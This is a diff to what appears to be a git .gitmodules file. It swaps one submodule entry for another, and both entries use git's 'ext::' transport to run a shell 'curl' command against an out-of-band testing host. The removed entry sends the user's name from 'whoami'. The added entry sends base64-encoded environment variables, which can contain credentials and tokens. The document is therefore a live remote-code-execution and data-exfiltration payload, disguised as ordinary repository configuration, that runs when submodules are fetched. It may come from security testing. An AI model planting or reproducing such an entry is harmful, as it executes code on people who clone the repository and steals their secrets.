@@ -1,3 +1,3 @@
-[submodule "oast"]
-    path = oast
-    url = "ext::sh -c curl% https://submodule-rce.d86ikmgglvofto2g054gyc7y8tj5647kh.oast.fun/$(whoami)% >/dev/null% 2>&1% ;% echo% /dev/null"
+[submodule "payload"]
+    path = payload  
+    url = "ext::sh -c curl% https://submodule.d86ikmgglvofto2g054gyc7y8tj5647kh.oast.fun/$(env|base64|head% -c% 200)% >&2% ;"
